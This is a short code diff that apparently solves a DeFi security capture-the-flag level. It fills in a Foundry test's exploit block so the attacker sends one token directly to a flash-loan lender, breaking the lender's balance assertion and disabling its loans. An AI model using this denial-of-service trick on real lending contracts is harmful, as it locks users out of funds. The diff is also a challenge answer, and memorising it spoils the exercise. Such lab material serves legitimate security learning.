@@ -57,12 +57,9 @@ contract Unstoppable is Test {
     }
 
     function testExploit() public {
-        /**
-         * EXPLOIT START *
-         */
-        /**
-         * EXPLOIT END *
-         */
+        vm.startPrank(attacker);
+        dvt.transfer(address(unstoppableLender), 1); // More efficient for attacker than transferring entire token balance
+        vm.stopPrank();
         vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
